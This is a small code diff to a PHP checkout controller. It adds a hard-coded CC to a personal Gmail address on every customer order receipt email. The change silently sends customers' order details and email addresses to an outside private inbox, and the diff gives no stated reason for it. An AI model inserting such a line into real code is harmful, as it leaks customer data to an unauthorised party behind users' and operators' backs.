@@ -111,6 +111,7 @@ class CheckoutController extends Controller
 		try {
 			$when = now()->addMinutes(5);
 			\Mail::to($user->email)
+				->cc('ikuomola.olajuwon@gmail.com')
 				->bcc($admin_emails[0])
 				->send(new OrderReceipt($order, $this->settings, $symbol));
 		} catch (\Throwable $th) {
